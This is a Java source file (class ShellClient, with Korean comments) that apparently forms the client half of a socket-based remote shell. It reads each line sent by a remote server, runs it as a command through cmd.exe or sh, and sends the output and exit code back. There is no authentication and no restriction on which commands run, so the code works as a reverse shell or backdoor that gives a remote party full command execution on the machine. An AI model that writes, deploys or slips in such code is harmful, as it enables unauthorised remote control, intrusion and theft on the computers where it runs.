package SocketClient;

import java.io.*;

public class ShellClient  {

    BufferedReader socketReader;
    BufferedWriter socketWriter;
    ProcessBuilder processBuilder;
    String os;

    public ShellClient(SocketClient SocketClient) {
        socketReader = SocketClient.getSocketReader();
        socketWriter = SocketClient.getSocketWriter();

        initShell();
        startExecThread();
    }

    public void initShell() {
        processBuilder = new ProcessBuilder();
        os = System.getProperty("os.name").toLowerCase();
    }

    private void startExecThread() {
        Thread thread = new Thread(new ExecThread());
        thread.start();
    }

    class ExecThread implements Runnable {
        @Override
        public void run() {
            while (true) {
                try {
                    // 서버로부터 명령어 수신
                    String hostCommand = socketReader.readLine();
                    if (hostCommand == null) {
                        System.out.println("Server disconnected.");
                        break;
                    }
                    System.out.println("server >>> " + hostCommand);

                    // 운영체제에 맞는 명령어 실행
                    if (os.contains("win")) {
                        processBuilder.command("cmd.exe", "/c", hostCommand);
                    } else {
                        processBuilder.command("sh", "-c", hostCommand);
                    }

                    // Start the process
                    Process process = processBuilder.start();

                    // 프로세스 결과 및 에러 읽기
                    StringBuilder result = new StringBuilder();
                    readStream(process.getInputStream(), result);
                    readStream(process.getErrorStream(), result);

                    int exitCode = process.waitFor();
                    result.append("Exited with code: ").append(exitCode).append("\n");

                    // 서버로 결과 전송
                    socketWriter.write(result.toString());
                    socketWriter.flush();

                } catch (IOException | InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }

        private void readStream(InputStream inputStream, StringBuilder result) throws IOException {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    result.append(line).append("\n");
                }
            }
        }
    }
}
